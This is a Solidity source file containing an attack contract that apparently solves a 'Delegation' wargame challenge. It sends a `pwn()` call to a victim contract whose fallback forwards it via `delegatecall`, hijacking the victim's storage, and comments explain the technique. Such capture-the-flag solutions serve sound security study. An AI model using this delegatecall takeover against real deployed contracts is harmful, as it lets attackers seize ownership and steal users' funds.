// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    /**
     * @dev Forces victim to execute `pwn()` function. Since `delegatecall` is used on the Delegation contract, it's
     * storage is updated with the execution of `pwn()` on the delegate (https://solidity-by-example.org/delegatecall/).
     * By passing a payload to the victim contract that does not match any of its existing function signatures, we
     * execute its fallback function. See https://solidity-by-example.org/sending-ether/ and
     * https://docs.soliditylang.org/en/v0.8.12/contracts.html#fallback-function for more information on fallback
     * functions.
     */
    function hackContract() external {
        bytes memory payload = abi.encodeWithSignature("pwn()");
        (bool result, ) = contractAddress.call(payload);
    }
}
